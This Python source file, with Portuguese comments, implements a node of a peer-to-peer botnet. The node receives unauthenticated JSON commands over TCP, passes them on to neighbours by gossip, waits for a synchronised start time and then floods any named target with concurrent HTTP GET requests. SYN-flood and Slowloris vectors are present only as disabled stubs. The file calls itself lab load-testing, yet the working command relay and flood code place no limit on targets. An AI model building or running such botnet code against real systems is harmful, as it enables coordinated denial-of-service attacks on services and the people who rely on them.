"""
bot.py — Nó da malha P2P (plano ofensivo / gerador de carga sincronizado).

Responsabilidades (thread por papel):
  1) gossip_server   — escuta mensagens dos vizinhos (TCP :7000), deduplica
                        por msg_id e propaga adiante (Gossip Protocol).
  2) process()        — aplica sharding pelo próprio IP, aguarda a barreira
                        de tempo (execute_at) e então dispara o vetor.

VETORES:
  HTTP_FLOOD  -> implementado de verdade: rajada de requisições GET
                 concorrentes contra o alvo, usando threads efêmeras.
                 Tecnicamente equivalente ao que ferramentas padrão de
                 load-testing fazem (ab/wrk/k6/Locust em modo distribuído).
  SYN_FLOOD   -> NÃO implementado. Ver docs/SAFETY_NOTES.md.
  SLOWLORIS   -> NÃO implementado. Ver docs/SAFETY_NOTES.md.

Este arquivo propositalmente não contém manipulação de sockets crus (raw
sockets) nem lógica de exaustão de conexão — apenas geração de carga via
requisições HTTP completas e válidas, contidas na rede isolada do laboratório.

Variáveis de ambiente:
  NEIGHBORS    - "host:port,host:port,..." dos vizinhos diretos na malha
  LISTEN_PORT  - porta TCP de escuta do gossip (default 7000)
  MY_ID        - rótulo do bot para logs (default hostname)
"""
import json
import os
import socket
import threading
import time
import uuid

import httpx

NEIGHBORS = [n for n in os.environ.get("NEIGHBORS", "").split(",") if n]
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "7000"))
MY_ID = os.environ.get("MY_ID", socket.gethostname())

_seen_lock = threading.Lock()
_seen_ids: set[str] = set()


def my_ip() -> str:
    try:
        return socket.gethostbyname(socket.gethostname())
    except OSError:
        return "127.0.0.1"


def gossip_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", LISTEN_PORT))
    srv.listen(32)
    print(f"[{MY_ID}] escutando gossip em :{LISTEN_PORT}, vizinhos={NEIGHBORS}")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=_handle_conn, args=(conn,), daemon=True).start()


def _handle_conn(conn):
    with conn:
        chunks = []
        conn.settimeout(2.0)
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                chunks.append(data)
        except socket.timeout:
            pass
        raw = b"".join(chunks)
        if not raw:
            return
        try:
            msg = json.loads(raw.decode())
        except json.JSONDecodeError:
            return
        on_receive(msg)


def on_receive(msg: dict):
    """Núcleo do Gossip Protocol: deduplicação por msg_id, processamento e
    propagação aos vizinhos (evita laços infinitos)."""
    msg_id = msg.get("msg_id")
    if not msg_id:
        return
    with _seen_lock:
        if msg_id in _seen_ids:
            return  # já visto -> descarta (evita loop/duplicata)
        _seen_ids.add(msg_id)

    print(f"[{MY_ID}] recebeu {msg.get('type')} msg_id={msg_id}")
    threading.Thread(target=process, args=(msg,), daemon=True).start()

    msg["ttl"] = msg.get("ttl", 1) - 1
    if msg["ttl"] > 0:
        propagate(msg)


def propagate(msg: dict):
    payload = json.dumps(msg).encode()
    for entry in NEIGHBORS:
        host, port = entry.split(":")
        try:
            with socket.create_connection((host, int(port)), timeout=1.0) as s:
                s.sendall(payload)
        except OSError:
            pass  # vizinho indisponível — o gossip segue por outras arestas


# --------------------------------------------------------------------------
# Sharding + barreira de sincronização + execução do vetor
# --------------------------------------------------------------------------
def process(msg: dict):
    if msg.get("type") != "LOADTEST":
        return

    ip = my_ip()
    last_octet = int(ip.split(".")[-1])
    rules = msg.get("sharding_rules", {"0": "HTTP_FLOOD", "1": "SYN_FLOOD", "2": "SLOWLORIS"})
    vetor = rules.get(str(last_octet % 3), "HTTP_FLOOD")

    execute_at = msg["execute_at"]
    target, port = msg["target"], msg["target_port"]
    duration = msg.get("duration_s", 5)

    print(f"[{MY_ID}] vetor={vetor} alvo={target}:{port} execute_at={execute_at} (ip={ip})")

    # --- barreira de tempo: espera o instante físico absoluto combinado ---
    while time.time() < execute_at:
        time.sleep(min(0.05, max(0, execute_at - time.time())))

    if vetor == "HTTP_FLOOD":
        run_http_flood(target, port, duration)
    else:
        run_stub_vector(vetor, target, port, duration)


def run_http_flood(target: str, port: int, duration: float, workers: int = 20):
    """Gera carga real via requisições HTTP GET concorrentes e válidas.
    Equivalente em técnica a ferramentas padrão de load-testing."""
    url = f"http://{target}:{port}/"
    stop_at = time.time() + duration
    counters = [0] * workers

    def worker(idx):
        with httpx.Client(timeout=2.0) as client:
            while time.time() < stop_at:
                try:
                    client.get(url)
                    counters[idx] += 1
                except httpx.HTTPError:
                    pass

    threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"[{MY_ID}] HTTP_FLOOD concluído: {sum(counters)} requisições enviadas em {duration}s")


def run_stub_vector(vetor: str, target: str, port: int, duration: float):
    """SYN_FLOOD e SLOWLORIS são reconhecidos pelo sharding mas NÃO executados.
    Ver docs/SAFETY_NOTES.md para a justificativa. Isso preserva 100% da
    lógica de particionamento de tarefas (RF02) sem embarcar uma técnica de
    exaustão de protocolo genuinamente funcional."""
    print(
        f"[{MY_ID}] vetor {vetor} atribuído para {target}:{port} "
        f"(execução real desabilitada por design — ver docs/SAFETY_NOTES.md)"
    )
    time.sleep(min(duration, 1))


def main():
    threading.Thread(target=gossip_server, daemon=True).start()
    print(f"[{MY_ID}] bot no ar, ip={my_ip()}")
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
